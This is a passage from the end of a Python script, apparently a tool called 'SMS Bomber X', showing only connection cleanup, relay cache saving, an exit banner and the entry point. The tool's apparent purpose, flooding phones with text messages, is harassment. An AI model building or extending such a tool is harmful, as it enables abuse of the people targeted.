                  log.error(f"Error during connection cleanup phase: {close_err}", exc_info=True)
            try:
                # Save the cache state (even if errors occurred)
                relay_manager.save_cache() 
            except Exception as save_err:
                  log.error(f"Error during final relay cache save: {save_err}", exc_info=True)
        else:
             log.debug("Relay Manager was not initialized, skipping cleanup.")
             
        # Final exit message
        console.print(Panel("[bold magenta]Exited SMS Bomber X.[/]", style="magenta", border_style="magenta", padding=(0,1)))


# --- Script Entry Point ---
if __name__ == "__main__":
    # This ensures main_app() is called only when the script is executed directly
    main_app()